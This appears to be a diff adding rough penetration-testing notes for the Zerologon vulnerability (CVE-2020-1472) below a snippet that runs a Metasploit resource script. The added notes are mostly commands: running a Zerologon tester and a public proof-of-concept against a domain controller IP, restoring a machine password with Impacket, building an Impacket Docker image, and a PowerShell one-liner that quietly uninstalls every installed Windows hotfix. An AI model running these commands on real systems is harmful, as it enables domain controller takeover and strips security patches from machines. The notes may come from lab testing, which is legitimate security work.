@@ -99,3 +99,43 @@ with open("msf_script.rc", "w") as f:
 
 os.system("msfconsole -q -r msf_script.rc")
 --
+Zerologin 
+
+https://github.com/SecuraBV/CVE-2020-1472
+sudo docker run -it docker.io/ttervoort/zerologon-tester SA-DC01-2022 10.2.10.11
+Get-HotFix | ForEach-Object { wusa /uninstall /kb:$_.HotFixID /quiet /norestart }
+
+-----
+CVE-2020-1472 POC
+https://github.com/dirkjanm/CVE-2020-1472
+
+git clone https://github.com/dirkjanm/CVE-2020-1472
+
+
+sudo docker build -t "impacket:latest" .
+sudo docker run -it --rm  "impacket:latest" .
+
+
+python restorepassword.py testsegment/s2016dc@s2016dc -target-ip 10.2.10.11 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...etc
+sudo docker run -it --rm "impacket:latest" python restorepassword.py testsegment/s2016dc@s2016dc -target-ip 10.2.10.11 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...
+
+# Use an official Python runtime as a parent image
+FROM python:3.9-slim
+
+# Set the working directory
+WORKDIR /app
+
+----
+Dockerfile
+# Clone the Impacket repository
+RUN apt-get update && apt-get install -y git \
+    && git clone https://github.com/fortra/impacket.git /app/impacket \
+    && cd /app/impacket \
+    && pip install .
+
+# Set the working directory to the Impacket examples directory
+WORKDIR /app/impacket/examples
+
+# Default command (can be overridden when running the container)
+CMD ["bash"]
+---
